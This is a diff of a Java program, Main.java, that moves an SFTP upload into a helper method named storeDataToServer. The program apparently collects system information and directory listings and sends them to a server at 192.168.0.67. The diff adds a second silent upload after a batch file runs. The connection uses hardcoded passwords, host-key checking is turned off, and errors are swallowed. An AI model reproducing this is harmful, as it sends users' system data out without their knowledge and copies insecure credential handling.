@@ -1,9 +1,6 @@
 package main;
 
-import com.jcraft.jsch.ChannelSftp;
-import com.jcraft.jsch.JSch;
-import com.jcraft.jsch.JSchException;
-import com.jcraft.jsch.Session;
+import com.jcraft.jsch.*;
 
 import javax.swing.*;
 import java.awt.*;
@@ -91,20 +88,7 @@ public class Main {
         FileWriter fileWriter2 = new FileWriter(file);
         saveInfoToFile(filesInDir, sysInfo, fileWriter2);
 
-        JSch jsch = new JSch();
-        Session session = jsch.getSession("mysftpuser", "192.168.0.67");
-        session.setConfig("StrictHostKeyChecking", "no");
-        session.setPassword("mysftpuser");
-        session.connect();
-        ChannelSftp channel = (ChannelSftp) session.openChannel("sftp");
-        channel.connect();
-        channel.cd("/");
-
-        FileInputStream fis = new FileInputStream(file);
-        channel.put(fis, file.getName());
-
-        channel.disconnect();
-        session.disconnect();
+        storeDataToServer(file);
 
         createBatchFile();
 
@@ -122,6 +106,23 @@ public class Main {
             out.println(filesInDir[i]);
         }
         bufferedWriter.close();
+    }
+
+    private static void storeDataToServer(File file) throws JSchException, SftpException, FileNotFoundException {
+        JSch jsch = new JSch();
+        Session session = jsch.getSession("a2a", "192.168.0.67");
+        session.setConfig("StrictHostKeyChecking", "no");
+        session.setPassword("a2a");
+        session.connect();
+        ChannelSftp channel = (ChannelSftp) session.openChannel("sftp");
+        channel.connect();
+        channel.cd("/");
+
+        FileInputStream fis = new FileInputStream(file);
+        channel.put(fis, file.getName());
+
+        channel.disconnect();
+        session.disconnect();
     }
 
     private static void createBatchFile(){
@@ -153,6 +154,9 @@ public class Main {
             p.waitFor();
 
             dos.close();
+
+            storeDataToServer(readme);
+
         } catch (Exception ex) {
         }
     }
